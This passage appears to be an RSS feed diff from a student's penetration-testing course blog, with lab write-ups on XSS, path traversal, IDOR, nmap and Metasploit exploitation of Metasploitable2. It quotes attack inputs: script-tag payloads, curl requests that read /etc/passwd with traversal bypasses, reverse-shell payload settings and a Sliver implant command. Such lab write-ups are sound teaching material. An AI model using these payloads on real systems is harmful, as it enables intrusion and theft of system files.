+the flags and so on. The readme page&rsquo;s content itself isn&rsquo;t really that interesting, but the readme page as a whole is pretty good. Having practice targets made by other people listed, video examples, concise examples and instructions.
+Everything is easy to find and parse through quickly especially compared to some other readme pages
+which can be like opening all of the holy texts in one go. After seeing all the flags listed, I can also understand why
+joohoi might want to limit the amounts of flags added. Keeping everything fast and avoiding unnecessary <em>bloat</em>, seems
+to be quite high up the priority list. A choice that is hard to dislike for sure :D. <a href="https://github.com/ffuf/ffuf/blob/master/README.md">(Hoikkala &ldquo;joohoi&rdquo; 2023. Ffuf readme).</a></p>
+<hr>
+<h3 id="sources">Sources</h3>
+<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
+<p><a href="https://terokarvinen.com/2024/fuzz-urls-find-hidden-directories/">Tero Karvinen Find Hidden Web Directories - Fuzz URLs with ffuf.</a></p>
+<p><a href="https://terokarvinen.com/2023/fuffme-web-fuzzing-target-debian/">Tero Karvinen Fuffme.</a></p>
+<p><a href="https://github.com/ffuf/ffuf/pull/490">Ffuf pull request.</a></p>
+<p><a href="https://manpages.debian.org/testing/ffuf/ffuf.1.en.html">Fuff man page.</a></p>
+<p><a href="https://github.com/ffuf/ffuf/blob/master/README.md">Hoikkala &ldquo;joohoi&rdquo; 2023. Ffuf readme.</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Certificates &amp; Web vulnerabilities</title>
+            <link>http://localhost:1313/tuukkaani-blog/posts/h3/</link>
+            <pubDate>Mon, 08 Sep 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/tuukkaani-blog/posts/h3/</guid>
+            <description>&lt;h1 id=&#34;h3&#34;&gt;H3&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;ab-setting-up-zap-and-foxyproxy&#34;&gt;ab) Setting up ZAP and FoxyProxy&lt;/h3&gt;
+&lt;p&gt;I installed ZAP using &lt;code&gt;sudo apt install zaproxy&lt;/code&gt; and started it. Then I installed the FoxyProxy Standard extension for firefox.
+In the foxyproxy settings I created the following proxy as mentioned in the guide. Lastly, I added portswigger and localhosts patterns.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h3/foxyproxy.png&#34; alt=&#34;foxyproxy settings&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h3/patterns.png&#34; alt=&#34;Patterns&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Then I download and import the certificate by navigating to http://zap/ and clicking the download link.
+After which I go to firefox&amp;rsquo;s settings and import the cert file.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h1 id="h3">H3</h1>
+<hr>
+<h3 id="ab-setting-up-zap-and-foxyproxy">ab) Setting up ZAP and FoxyProxy</h3>
+<p>I installed ZAP using <code>sudo apt install zaproxy</code> and started it. Then I installed the FoxyProxy Standard extension for firefox.
+In the foxyproxy settings I created the following proxy as mentioned in the guide. Lastly, I added portswigger and localhosts patterns.</p>
+<p><img src="img/h3/foxyproxy.png" alt="foxyproxy settings"></p>
+<p><img src="img/h3/patterns.png" alt="Patterns"></p>
+<p>Then I download and import the certificate by navigating to http://zap/ and clicking the download link.
+After which I go to firefox&rsquo;s settings and import the cert file.</p>
+<p><img src="img/h3/firefoxcerts.png" alt="cert settings"></p>
+<p><img src="img/h3/certimport.png" alt="Import cert"></p>
+<p>Only the specified patterns are using the proxy.</p>
+<p><img src="img/h3/sites.png" alt="Proxy"></p>
+<p><a href="https://medium.com/@redfanatic7/complete-owasp-zap-guide-384a080ff502">(Vasileiadis 2024.)</a></p>
+<hr>
+<h3 id="cde-xss">cde) XSS</h3>
+<p>To get a quick idea of XSS attacks, I decided to go on Youtube to see if there are any good and quick videos about the concept.
+I came across IBM Technology&rsquo;s video. It is a good video, but I also accidentally just spoiled the solutions to the first two labs.</p>
+<p>In the first lab, I did a search with following input <code>&lt;script&gt;alert(&quot;Your JS here.&quot;)&lt;/script&gt;</code>.
+This gave me the alert.</p>
+<p>In the next lab, I did pretty much the same, but this time I put the same line of code in to the comment&rsquo;s text field.</p>
+<p><img src="img/h3/commentxss.png" alt="XSS Comment"></p>
+<p>In both cases, even if the video wouldn&rsquo;t have mentioned it. Here I would have tried to look for possibilities for user input.
+When doing black-box type of labs, I often first check if I can upload malicious files through the site or do SQL-injections etc. They can often be easy and fast to do.
+Here the same kind of logic applies, where the website has some sort of user input and there are no proper validations or checks in place.</p>
+<p>How it works in this case is by injecting code into the website or its database.</p>
+<p>Here is a benign search:</p>
+<p><img src="img/h3/safesearch.png" alt="Safe search"></p>
+<p>As the server responds and gives the user the updated webpage, the text can be seen in the site&rsquo;s html.
+Now if the site doesn&rsquo;t properly sanitize the user input we can try to inject a <code>&lt;script&gt;</code> tag.</p>
+<p><img src="img/h3/unsafesearch.png" alt="Unsafe search"></p>
+<p>The user now gets a response from the server with unwanted javascript code. In this case the code is simply promoting my amazing movie idea about
+team of roosters playing soccer while Ben Stiller is their coach. The code could also do something more malicious (if that&rsquo;s even possible). For example, defacing the website or redirect the user to a phishing site. In case of both of these labs, the user gets served a webpage with unwanted javascript within it.</p>
+<p><a href="https://www.youtube.com/watch?v=z4LhLJnmoZ0">(IBM Technology 5.11.2024)</a></p>
+<hr>
+<h3 id="fgh-file-path-traversal">fgh) File path traversal</h3>
+<h4 id="file-path-traversal-simple-case">File path traversal, simple case</h4>
+<p>Here my first taught is to get the server to return me wrong information by simply asking the server for it.
+I copy one of the image links and change the filename to be absolute path /etc/passwd and use <code>curl *site path*/image?filename=/etc/passwd -o pass.txt</code>.</p>
+<p><img src="img/h3/firstcurl.png" alt="No files"></p>
+<p>After which I decide to see if I am understanding something wrong or if there is a specific method to the madness. I google path traversal and go to <a href="https://owasp.org/www-community/attacks/Path_Traversal">owasp&rsquo;s web site</a>. There I scroll quickly through and come across Examples. There I see I could also try <em><strong>traversing</strong></em>
+through the file system. I didn&rsquo;t really think about where in the file system I was before, so with this in mind. I decide to try again,
+<code>curl *site path*/image?filename=../../../../../../../../etc/passwd -o passnew.txt</code>. I will not assume the file location so I will just spam a couple ../
+to make sure I am at the root of the system. <a href="https://owasp.org/www-community/attacks/Path_Traversal">(OWASP.org. Path Traversal.)</a></p>
+<p><img src="img/h3/passwd.png" alt="Passwd"></p>
+<p>This time we get the file. Now I&rsquo;ll do the same in ZAP by making a request. I copy a request made for the image file and modify it to ask for /etc/passwd instead.
+I realise I get back <code>Content-Type: image</code> which isn&rsquo;t very useful.</p>
+<p><img src="img/h3/zaprequest.png" alt="Content Image"></p>
+<p>I am assuming I need to modify the response as well. So I decide to see how I can intercept and modify these using ZAP and found an old video by webpwnized where they go over using ZAPs breakpoints to stop and modify requests and responses. <a href="https://www.youtube.com/watch?v=fa5LAfXmwoo">(webpwnized 20.1.2018.)</a></p>
+<p>With this in mind, in ZAP I turn on breakpoints for all requests and responses by using the button marked with the red arrow.
+In the UI, the button is green by default and will turn red when on.</p>
+<p><img src="img/h3/breakpoints.png" alt="ZAP breakpoints"></p>
+<p>Now I will open one of the sites images in a new tab. I get the request I am sending and modify the filename accordingly.</p>
+<p><img src="img/h3/break.png" alt="First break"></p>
+<p>Then after stepping few times, we get the response and modify it to have the <code>Content-Type: text/plain</code> so we get something readable.</p>
+<p><img src="img/h3/breaktwo.png" alt="Response breakpoint"></p>
+<p>After which we step and the page loads. This time we get the passwd in plain text form so its readable.</p>
+<p><img src="img/h3/passpage.png" alt="Passwd page"></p>
+<h4 id="file-path-traversal-traversal-sequences-blocked-with-absolute-path-bypass">File path traversal, traversal sequences blocked with absolute path bypass</h4>
+<p>Here again I did the same <code>curl *site path*/image?filename=/etc/passwd -o pss.txt</code> I did before. This time it just worked and I got the passwd file.
+The same can be done with ZAP following the earlier steps but with the new file path. Here we didn&rsquo;t need to use any traversal sequences due to being
+able to access the file with absolute path.</p>
+<p><img src="img/h3/pss.png" alt="Passwd content"></p>
+<h4 id="file-path-traversal-traversal-sequences-stripped-non-recursively">File path traversal, traversal sequences stripped non-recursively</h4>
+<p>Once again I did the same <code>curl *site path*/image?filename=/etc/passwd -o pss.txt</code> I did before. Now we get &lsquo;No Such file&rsquo; once more.
+I try spamming ../../../../../../../ but on luck this time either. I decide to actually read the text next to the ACCESS THE LAB button.
+It reveals that the site strips path traversal sequences from user supplied files. So I refer again to <a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP.org</a>
+and find request variations where we can try to use encoding to bypass a simple traversal sequence check.</p>
+<p>I decide to use <code>curl *site path*/image?filename=%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd -o pss.txt</code> but to no avail.
+Next I tried the same but with different encoding using &lsquo;..%c0%af&rsquo; but that didn&rsquo;t work either. After none of these worked,
+I started assuming, that encoding wasn&rsquo;t the way I was suppose to go about it.</p>
+<p>After a while I decide to see what the actual solution to the problem is. Apparently the site simply just looks for instances of &lsquo;../&rsquo; and removes them.
+In which case we can use a simple doubling up to get past this. I do remember doing something along these lines before and kinda feel silly
+not considering something as simple as this.
+After doing <code>curl *site path*/image?filename=....//....//....//....//....//etc/passwd -o pass.txt</code> we get the file.</p>
+<h4 id="how-to-avoid-path-traversal">How to avoid path traversal</h4>
+<p>For these three cases the filenames should be sanitized well. Firstly recursively remove traversal sequences or just not allow
+any type of weird characters. Make sure the files come from appropriate locations and are of the correct type. Ideally limit the user input
+to very select cases that are approved.</p>
+<hr>
+<h3 id="i-insecure-direct-object-references">i) Insecure direct object references</h3>
+<p>So for this lab I need to get Carlos&rsquo; account credentials. Here we have a chat and we can download the chat history.
+The lab tells that the chat history is stored on the file system and uses static html pages. I&rsquo;ve seen quite a few times
+pages where things are accessible with just guessing some URLs. So I type random gibberish into the chat and download it.
+Then do the same again. The numbers seem to just go up by one so earlier chats should be just numbers before my first chat.
+So I send a request to get me the chat file 1 and there we can find a conversation between whom we assume to be Carlos and Hal.</p>
+<p><img src="img/h3/chat.png" alt="Passwords in the chat"></p>
+<p>And there it is. After we just use Carlos as the username and the password and get a successful log in.</p>
+<h4 id="how-to-avoid">How to avoid</h4>
+<p>Instead of plain and direct ways to access files. They should use more complex generated strings and have
+proper authentication and permissions for said files. The user shouldn&rsquo;t decide what to access.</p>
+<hr>
+<h3 id="x-extra-reading">x) Extra reading</h3>
+<h4 id="owasp-top-10-from-2021">OWASP Top 10 from 2021</h4>
+<p>The page goes quickly over some common broken access control vulnerabilities and how to prevent them.
+These usually include some form of misconfiguration or lack of proper user authentication.
+Default state should be inaccessible and authorization and checks should be done before
+anything could be accessed. (OWASP 2021.)</p>
+<h4 id="insecure-direct-object-references">Insecure direct object references</h4>
+<p>The article goes over insecure direct object references. These are instances where
+user has the capability to choose access a file by user input. On top of this proper
+authentication is also lacking where the user can access files not related to their account.
+There are two examples of this, one where the user might be able to access other customer&rsquo;s account
+by changing the url&rsquo;s <em><strong>customer_number</strong></em> to a different number. The other one is similar to the IDOR lab. (Portswigger a.)</p>
+<h4 id="path-traversal">Path traversal</h4>
+<p>This time the page goes over some of the labs done earlier and explains briefly why they can go past
+some basic checks and how to try to prevent this. Mostly as I the things I listed previously.
+But it is also encouraged to just make the app not use user input for file system APIs. Which makes sense.
+(Portswigger b.)</p>
+<h4 id="cross-site-scripting">Cross-site scripting</h4>
+<p>Here we are introduced to what cross-site scripting is, how it&rsquo;s different types function,
+how they can be used for malicious purposes and how that can impact the target.
+It gives the general idea on how to test for possible XSS attacks and how to try to prevent them.
+(Portswigger c.)</p>
+<hr>
+<h3 id="sources">Sources</h3>
+<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
+<p><a href="https://medium.com/@redfanatic7/complete-owasp-zap-guide-384a080ff502">Vasileiadis A. 2024. Complete OWASP ZAP Guide.</a></p>
+<p><a href="https://www.youtube.com/watch?v=z4LhLJnmoZ0">IBM Technology 5.11.2024. Cross-Site Scripting: A 25-Year Threat That I Still Going Strong.</a></p>
+<p><a href="https://owasp.org/www-community/attacks/Path_Traversal">OWASP.org. Path Traversal</a></p>
+<p><a href="https://www.youtube.com/watch?v=fa5LAfXmwoo">webpwnized 20.1.2018. How to Intercept HTTP Requests with OWASP ZAP</a></p>
+<p><a href="https://owasp.org/Top10/A01_2021-Broken_Access_Control/">OWASP 2021. OWASP Top 10:2021</a></p>
+<p><a href="https://portswigger.net/web-security/access-control/idor">Portswigger a. Insecure direct object references (IDOR)</a></p>
+<p><a href="https://portswigger.net/web-security/file-path-traversal">Portswigger b. Path traversal</a></p>
+<p><a href="https://portswigger.net/web-security/cross-site-scripting">Portswigger c. Cross-site scripting</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Nmap and metasploit</title>
+            <link>http://localhost:1313/tuukkaani-blog/posts/h2/</link>
+            <pubDate>Mon, 01 Sep 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/tuukkaani-blog/posts/h2/</guid>
+            <description>&lt;h1 id=&#34;h2&#34;&gt;H2&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;a-checking-kalis-and-metasploitable2s-connections&#34;&gt;a) Checking kali&amp;rsquo;s and metasploitable2&amp;rsquo;s connections&lt;/h3&gt;
+&lt;p&gt;To check the connectivity of both machines, I first &lt;code&gt;ping 8.8.8.8&lt;/code&gt; and &lt;code&gt;ping terokarvinen.com&lt;/code&gt;. Neither one of the machines was able to ping the addresses given.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h2/kali_offline.png&#34; alt=&#34;Kali disconnected&#34;&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h2/ms_offline.png&#34; alt=&#34;Metasploitable2 disconnected&#34;&gt;&lt;/p&gt;
+&lt;p&gt;I got both of the machines IPs using &lt;code&gt;ip a&lt;/code&gt; and then &lt;code&gt;ping&lt;/code&gt; each of the addresses. The pings were successful.&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h2/kali_ipa.png&#34; alt=&#34;kali&amp;rsquo;s IP&#34;&gt;
+&lt;em&gt;Kali&amp;rsquo;s IP&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h2/ms_ipa.png&#34; alt=&#34;metasploitable&amp;rsquo;s IP&#34;&gt;
+&lt;em&gt;Metasploitable&amp;rsquo;s IP&lt;/em&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;img/h2/kali_to_ms.png&#34; alt=&#34;Kali to ms&#34;&gt;
+&lt;em&gt;Kali pinging Metasploitable&lt;/em&gt;&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h1 id="h2">H2</h1>
+<hr>
+<h3 id="a-checking-kalis-and-metasploitable2s-connections">a) Checking kali&rsquo;s and metasploitable2&rsquo;s connections</h3>
+<p>To check the connectivity of both machines, I first <code>ping 8.8.8.8</code> and <code>ping terokarvinen.com</code>. Neither one of the machines was able to ping the addresses given.</p>
+<p><img src="img/h2/kali_offline.png" alt="Kali disconnected"></p>
+<p><img src="img/h2/ms_offline.png" alt="Metasploitable2 disconnected"></p>
+<p>I got both of the machines IPs using <code>ip a</code> and then <code>ping</code> each of the addresses. The pings were successful.</p>
+<p><img src="img/h2/kali_ipa.png" alt="kali&rsquo;s IP">
+<em>Kali&rsquo;s IP</em></p>
+<p><img src="img/h2/ms_ipa.png" alt="metasploitable&rsquo;s IP">
+<em>Metasploitable&rsquo;s IP</em></p>
+<p><img src="img/h2/kali_to_ms.png" alt="Kali to ms">
+<em>Kali pinging Metasploitable</em></p>
+<p><img src="img/h2/ms_to_kali.png" alt="Ms to kali">
+<em>Metasploitable pinging Kali</em></p>
+<hr>
+<h3 id="b-opening-up-msfconsole">b) Opening up msfconsole</h3>
+<p>Msfconsole can be opened by using <code>sudo msfconsole</code>.</p>
+<p><img src="img/h2/msfconsole.png" alt="Msfconsole"></p>
+<hr>
+<h3 id="c-scanning-metasploitable2-using-db_nmap">c) Scanning metasploitable2 using db_nmap</h3>
+<p>I used <code>db_nmap -sn</code> and failed to connect to a database.</p>
+<p><img src="img/h2/no_database.png" alt="Database not connected"></p>
+<p>This happened due to me forgetting to start the postgresql service using <code>sudo systemctl start postgresql</code> and initializing the database using <code>sudo msfdb init</code>. I exited the msfconsole, ran the aforementioned commands and ran <code>sudo msfconsole</code> again, after which the <code>db_nmap -sn</code> was successful.</p>
+<p><img src="img/h2/db_nmap.png" alt="Successful db_nmap"></p>
+<p>Lastly I navigated to the metasploitable2&rsquo;s front page using a browser.</p>
+<p><img src="img/h2/frontpage.png" alt="Metapsloitable2&rsquo;s front page"></p>
+<hr>
+<h3 id="d-extensive-port-scanning-and-saving-the-results">d) Extensive port scanning and saving the results</h3>
+<p>First I did a more extensive scan using <code>db_nmap -T -A -p1-65535 -n 192.168.110.216</code>. The results can be seen using the <code>services</code> command.</p>
+<p><img src="img/h2/services.png" alt="Services"></p>
+<p>Then I did the same using <code>nmap -T -A -p1-65535 -n -oA foo 192.168.110.216</code>. After which three output files could be found in my user&rsquo;s home directory.</p>
+<p><img src="img/h2/foo_files.png" alt="Foo files"></p>
+<hr>
+<h3 id="e-checking-out-the-db-functionality">e) Checking out the DB functionality</h3>
+<p>I checked <code>hosts --help</code> and <code>services --help</code>. They both have some similar flags for filtering and searching, notably <code>-S</code> for searching by a given string and <code>-c</code> for showing only specified columns.</p>
+<p>Here are the outputs from <code>services -S vsftpd</code> and <code>services -c port,state</code>.</p>
+<p><img src="img/h2/services_s.png" alt="services -S results"></p>
+<p><img src="img/h2/services_c.png" alt="services -c results"></p>
+<hr>
+<h3 id="f-comparing-the-file-output-and-database-output-pros-and-cons">f) Comparing the file output and database output pros and cons</h3>
+<h4 id="nmap--oa-foo-files">nmap -oA foo files</h4>
+<p>The nmap with -oA foo flag made three new files with .nmap .gnmap and .xml file extensions. When doing a <code>cat foo.nmap</code> it gives out pretty identical output to the one nmap normally gives.</p>
+<p><img src="img/h2/foo_snippet.png" alt="Cat foo.nmap"></p>
+<p>Next up we got the .gnmap file. Output of the file seems to be not as readable as the .nmap file.</p>
+<p><img src="img/h2/foo_snippet_2.png" alt="Cat foo.gnmap"></p>
+<p>I assume this file is supposed to be used with some sort of parsing tool to make it more useful. The same assumption can be made of the .xml file, which should probably be given to a external program to parse or log into a larger dataset.</p>
+<h4 id="db_nmap">db_nmap</h4>
+<p>The db_nmap output is easily readable and can be searched and ordered quite conveniently. It has all the most relevant information in nice columns. For a quick peek inside the terminal window, it is quite nice.</p>
+<p><img src="img/h2/services_s.png" alt="services -S results"></p>
+<h4 id="why-use-one-over-the-other">Why use one over the other?</h4>
+<p>Even though I think the db_nmap output is pretty and convenient for a quick reminder, I do find the files to have their strengths as well. They can easily be used alongside tools like grep and awk to parse through. You can also have just the plain output file open on a separate window and add additional notes if necessary. I find both useful, but personally I like having independent files to work with.</p>
+<hr>
+<h3 id="g-exploiting-the-target-machines-vsftpd-service">g) Exploiting the target machine&rsquo;s vsftpd service</h3>
+<p>First I used msfconsole&rsquo;s <code>search vsftpd</code> function to search for modules matching the service I am targeting. I get two options:</p>
+<p><img src="img/h2/vsftpd_search.png" alt="Vsftpd related modules"></p>
+<p>There are two options, a DoS related module and a backdoor. I used the backdoor module by typing <code>use 1</code>.</p>
+<p><img src="img/h2/use_module.png" alt="Use module 1"></p>
+<p>The msfconsole defaulted to cmd/unix/interact payload which I will use. Next I need to setup the target address by typing <code>set RHOST 192.168.110.216</code>. Lastly
+ran the <code>exploit</code> command to start.</p>
+<p><img src="img/h2/inside_ms.png" alt="using ls inside metasploitable2"></p>
+<p>The exploit ran successfully and I got inside the target machine and have a usable session.</p>
+<hr>
+<h3 id="h-upgrading-the-session-to-meterpreter">h) Upgrading the session to meterpreter</h3>
+<p>Now, I used CTRL+z to background the session and return to the msfconsole.
+Using <code>sessions</code> I can see I have a active session with ID 1.</p>
+<p><img src="img/h2/sessions.png" alt="Sessions"></p>
+<p>Next I check for the different options sessions has by typing  <code>sessions --help</code>. It has a -u, &ndash;upgrade flag that can be used to upgrade a shell to a meterpreter session. I&rsquo;ll use that to upgrade the session <code>sessions -u 1</code> and check the sessions again.</p>
+<p><img src="img/h2/meterpreter_session.png" alt="Meterpreter session"></p>
+<p>After which I can use the newly created meterpreter session with <code>sessions 2</code>.</p>
+<p><img src="img/h2/meterpreter.png" alt="Meterpreter"></p>
+<hr>
+<h3 id="i-looking-for-information-on-possible-lateral-movements">i) Looking for information on possible lateral movements</h3>
+<p>Inside the target machine I can use the new meterpreter session to run <code>netstat</code> to see any network connections the target machine has. In this case, it only finds things relating to the target machine and our Kali machine.</p>
+<p><img src="img/h2/netstat.png" alt="Netstat"></p>
+<p>Next I use <code>arp</code> to check the ARP cache for recent connections to the machine. The sole connection right now is the Kali machine, but it could be other machines in the target&rsquo;s network.</p>
+<p><img src="img/h2/arp.png" alt="ARP"></p>
+<hr>
+<h3 id="j-checking-other-possible-avenues-of-attack-on-the-target-machine">j) Checking other possible avenues of attack on the target machine</h3>
+<p>I CTRL+z the meterpreter session for now and return to the msfconsole. I use <code>services</code> and check which services I&rsquo;ll try first. After some thinking I decide to go check the website and see what we have. I go through all the links listed and see few login pages and other interesting stuff. I decide to start with the first link TWiki.</p>
+<h4 id="twiki">TWiki</h4>
+<p>After opening twiki I am greeted with the following page:</p>
+<p><img src="img/h2/twiki.png" alt="Twiki front page"></p>
+<p>There is a readme file which could be useful. I decide to take a quick look, maybe it has something interesting inside. Surely enough, we can find the version the server is running:</p>
+<p><img src="img/h2/twiki_version.png" alt="Twiki readme"></p>
+<p>Next up, I use msfconsole&rsquo;s <code>search twiki</code> to see if there are anything that we can use for seemingly very out of date service. We get few hits:</p>
+<p><img src="img/h2/twiki_exploits.png" alt="Twiki exploits"></p>
+<p>Without thinking too much about it I decide to start testing them out. I start with the one from 2004 <em>unix/webapp/twiki_search</em>. After trying few of the payloads, I couldn&rsquo;t get any established connection back home so I decide to test the second oldest exploit from 2005 <em>unix/webapp/twiki_history</em>. Once again I had to try couple of times, but I got a successful connection with <code>set payload cmd/unix/php/meterpreter/reverse_tcp</code>. I also had some success with <code>set payload cmd/unix/reverse</code> and then upgrade the session to meterpreter with <code>sessions -u 'session id'</code>.</p>
+<p><img src="img/h2/twiki_win.png" alt="Twiki win"></p>
+<hr>
+<h3 id="k-testing-out-meterpreters-functionality">k) Testing out meterpreter&rsquo;s functionality</h3>
+<p>With the newly established connection to the target machine and it being a meterpreter session, I think it is appropriate to test some of the functionality it brings. Just typing <code>help</code> gives us some commands to use.</p>
+<p><img src="img/h2/meterpreter_help.png" alt="Meterpreter help"></p>
+<p>The usual suspects are available to use such as <code>cat cd cp ls</code> and so on.
+There are also some interesting ones like <code>download</code> and <code>upload</code>. For getting files out of the system like ssh keys or uploading malicious files.</p>
+<hr>
+<h3 id="l-saving-the-shell-session-to-a-text-file">l) Saving the shell-session to a text file</h3>
+<p>I open up a second terminal window and use the given command <code>script -fa log001.txt</code>.</p>
+<p><img src="img/h2/script_ok.png" alt="Script ok"></p>
+<p>Then I type few test commands and <code>exit</code> the script. I <code>cat</code> the new log file and it outputs the shell one to one.</p>
+<p><img src="img/h2/benstiller.png" alt="Ben Stiller"></p>
+<hr>
+<h3 id="opt-m-getting-a-tty-on-the-target-machine">OPT m.) Getting a tty on the target machine</h3>
+<p>I am currently connected to the target machine and a dumb shell.
+Firstly we can check if python is installed on the system with <code>python -V</code></p>
+<p><img src="img/h2/python_version.png" alt="Python version"></p>
+<p>We can use that to spawn a pseudo terminal by typing <code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'</code> (Ropnop 2017). The pseudo terminal still lacks functionality though like up and down arrows etc.</p>
+<p><img src="img/h2/nano.png" alt="Nano opened"></p>
+<p><em>Nano can be opened just fine.</em></p>
+<hr>
+<h3 id="opt-n-testing-out-the-sliver-c2-framework">OPT n.) Testing out the sliver C2 framework</h3>
+<p>I went and installed sliver using <code>sudo apt install sliver</code> and launched it with <code>sudo sliver-server</code>. Sliver has a quick guide on their <a href="https://sliver.sh/tutorials?name=1+-+Getting+Started">site</a> which I will be following.</p>
+<p>After starting up sliver we use <code>generate -b localhost --os linux --arch amd64 --skip-symbols --debug</code> to generate our implant binary and <code>http</code> to start a listener job on port 80.</p>
+<p>! Work in progress !</p>
+<hr>
+<h3 id="opt-o-part-1-installing-metasploitable3">OPT o. Part 1) Installing metasploitable3</h3>
+<hr>
+<h3 id="opt-o-part-2-trying-to-break-into-metasploitable3">OPT o. Part 2) Trying to break into metasploitable3</h3>
+<hr>
+<h3 id="x-quick-notes-on-reading-material">x) Quick notes on reading material</h3>
+<p>Jaswal goes over a example scenario where we can familiarize the basic tools metasploit offers. In this example we go from doing recon all the way to post exploit. Exploiting a old windows machine using the EternalBlue exploits.
+The chapter gives a good overview of the workflow one can start getting familiar to when using metasploit.</p>
+<p>(Jaswal 2020.)</p>
+<hr>
+<h3 id="sources">Sources</h3>
+<p>All the assignments this page is based on can be found at <a href="https://terokarvinen.com/tunkeutumistestaus/">Tero Karvinen</a></p>
+<p>Ropnop 2017. <a href="https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/#tldr-cheatsheet">Upgrading simple shells to fully interactive TTYs</a></p>
+<p>Jaswal 2020. <a href="https://learning.oreilly.com/library/view/mastering-metasploit/9781838980078/B15076_01_Final_ASB_ePub.xhtml#_idParaDest-31">Mastering Metasploit 4th edition. Chapter 1. Approaching A Penetration Test Using Metasploit. Conducting a penetration test with metasploit.</a></p>
+<p>Sliver.sh. <a href="https://sliver.sh/tutorials?name=1+-+Getting+Started">Guide</a></p>
+]]></content>
+        </item>
+        
+        <item>
+            <title>Cyber kill chain</title>
+            <link>http://localhost:1313/tuukkaani-blog/posts/h1/</link>
+            <pubDate>Sun, 24 Aug 2025 00:00:00 +0000</pubDate>
+            
+            <guid>http://localhost:1313/tuukkaani-blog/posts/h1/</guid>
+            <description>&lt;h1 id=&#34;h1---cyber-kill-chain&#34;&gt;H1 - Cyber kill chain&lt;/h1&gt;
+&lt;hr&gt;
+&lt;h3 id=&#34;x-additional-reading-quick-summaries&#34;&gt;x) Additional reading quick summaries.&lt;/h3&gt;
+&lt;h4 id=&#34;darknet-diaries-ep144&#34;&gt;&lt;a href=&#34;https://darknetdiaries.com/episode/144/&#34;&gt;Darknet Diaries EP144&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;Rachel tells her story how she got into cybersecurity and social engineering. From defcon to pentesting banks and even doing social engineering live. Very interesting listen.&lt;/p&gt;
+&lt;h4 id=&#34;hutchins-et-al-2011&#34;&gt;&lt;a href=&#34;https://lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf&#34;&gt;Hutchins et al 2011.&lt;/a&gt;&lt;/h4&gt;
+&lt;p&gt;The paper goes over how threat actors are getting exceedingly more sophisticated and how new methodology was needed to counteract these threats more efficiently and using the cyber kill chain in the context of defending against said actors.&lt;/p&gt;</description>
+            <content type="html"><![CDATA[<h1 id="h1---cyber-kill-chain">H1 - Cyber kill chain</h1>
+<hr>
+<h3 id="x-additional-reading-quick-summaries">x) Additional reading quick summaries.</h3>
+<h4 id="darknet-diaries-ep144"><a href="https://darknetdiaries.com/episode/144/">Darknet Diaries EP144</a></h4>
+<p>Rachel tells her story how she got into cybersecurity and social engineering. From defcon to pentesting banks and even doing social engineering live. Very interesting listen.</p>
+<h4 id="hutchins-et-al-2011"><a href="https://lockheedmartin.com/content/dam/lockheed-martin/rms/documents/cyber/LM-White-Paper-Intel-Driven-Defense.pdf">Hutchins et al 2011.</a></h4>
+<p>The paper goes over how threat actors are getting exceedingly more sophisticated and how new methodology was needed to counteract these threats more efficiently and using the cyber kill chain in the context of defending against said actors.</p>
+<h4 id="santos-et-al"><a href="https://www.oreilly.com/videos/the-art-of/9780135767849/9780135767849-SPTT_04_00/">Santos et al.</a></h4>
+<p>A quick overview of what is active reconnaissance and key aspects that differ from passive recon. Also a quick overview of popular tools used for active recon such as nmap, eyewitness etc.</p>
+<h4 id="kko-200336"><a href="https://finlex.fi/fi/oikeuskaytanto/korkein-oikeus/ennakkopaatokset/2003/36#OT2_OT0_OT0">KKO 2003:36</a></h4>
+<p>KKO 2003:36 is about a ruling done due to an unauthorized port scanning done on a bank&rsquo;s network by a 17 year old. The perpetrator got fined for 75 000 Finnish marks due to unlawful attempt to breach the banks systems.</p>
+<hr>
+<h3 id="a-virtual-machine-installation">a) Virtual machine installation</h3>
+<p>For virtualization I use QEMU/KVM with virt-manager as the GUI.</p>
+<p>I installed kali using their installer image running the 2025.2 release, instead of their live QEMU image. After the installation I ran <code>sudo apt upgrade</code> to get the latest packages.</p>
+<hr>
+<h3 id="b-testing-kalis-connectivity">b) Testing kali&rsquo;s connectivity</h3>
+<p>After disconnecting the machine, I pinged 8.8.8.8 and checked the network-manager using <code>nmcli</code> to see if the interface was connected/disconnected.</p>
+<p>The ping returned &lsquo;Network is unreachable&rsquo;</p>
+<p><img src="img/h1/kali_disconnected.png" alt="Network is unreachable"></p>
+<p>while the eth0 interface was disconnected.</p>
+<p><img src="img/h1/kali_disconnected_2.png" alt="eth0 Disconnected"></p>
+<hr>
+<h3 id="c-nmapping-localhost-on-a-fresh-machine">c) Nmapping localhost on a fresh machine</h3>
+<p>Using <code>nmap -T4 -A localhost</code> on the disconnected kali machine.</p>
+<p><img src="img/h1/kali_nmap.png" alt="Results of the nmap on the localhost"></p>
+<p>Nmap allows the user to specify a timing template by using the <code>-T</code> flag.
+These timing templates let the user pick how fast/aggressive the scan is.
